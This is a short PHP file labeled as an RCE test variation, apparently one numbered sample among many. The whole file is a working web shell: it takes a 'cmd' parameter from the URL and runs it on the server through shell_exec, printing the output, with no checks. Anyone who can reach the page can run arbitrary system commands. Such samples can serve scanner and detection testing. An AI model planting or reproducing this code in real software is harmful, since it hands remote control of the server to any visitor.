<?php
// RCE test variation #898
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>